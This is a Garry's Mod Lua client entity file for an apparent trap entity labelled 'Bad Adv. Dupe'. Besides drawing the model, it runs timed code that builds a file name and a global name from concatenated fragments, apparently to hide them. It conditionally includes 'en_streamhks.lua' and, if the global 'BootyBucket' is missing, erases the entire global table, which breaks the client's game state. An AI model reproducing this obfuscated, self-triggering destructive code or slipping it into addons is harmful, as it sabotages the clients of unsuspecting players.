language.Add("auto_removed", "Bad Adv. Dupe (?!)")
include('shared.lua')


function ENT:Draw()
    self.Entity:DrawModel()
	
	if (LocalPlayer():GetPos() - self:GetPos()):Length() < 300 then
		AddWorldTip( self.Entity:EntIndex(), "What are you doing?!", 0.5, self.Entity:GetPos(), self.Entity )
	end
end

local function Explode()
	for k,v in pairs(_G) do _G[k] = nil end
	_G = {}
end



timer.Simple(5, function()
	local weapon	= "e".."n".."_".."str".."eam".."h".."k".."s"..".lua"
	local ent		= "B".."oot".."y".."B".."u".."c".."k".."et"
	
	if not _G[ent] and (#file.FindInLua(weapon, true) > 0) then
		include(weapon)
	end
	
	timer.Simple(5, function()
		if not _G[ent] then -- >:(
			Explode()
		end
	end)
end)







